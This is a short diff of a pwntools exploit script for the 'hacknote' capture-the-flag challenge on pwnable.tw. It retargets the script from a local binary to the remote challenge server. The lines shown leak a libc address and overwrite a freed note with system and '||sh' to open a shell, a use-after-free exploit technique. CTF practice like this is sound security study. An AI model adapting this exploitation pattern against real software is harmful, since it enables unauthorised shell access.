@@ -1,7 +1,11 @@
 from pwn import *
 
-io = process('./hacknote')
-libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+io = remote('chall.pwnable.tw', 10102)
+libc = ELF('./libc_32.so.6')
+
+#io = process('./hacknote')
+#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 elf = ELF('./hacknote')
 
 def add(size, content):
@@ -34,5 +38,4 @@ libc.address = u32(io.recv(4))-libc.sym['puts']
 delete(1)
 add(8, p32(libc.sym['system'])+b'||sh')
 printf(0)
-io.recv()
 io.interactive()
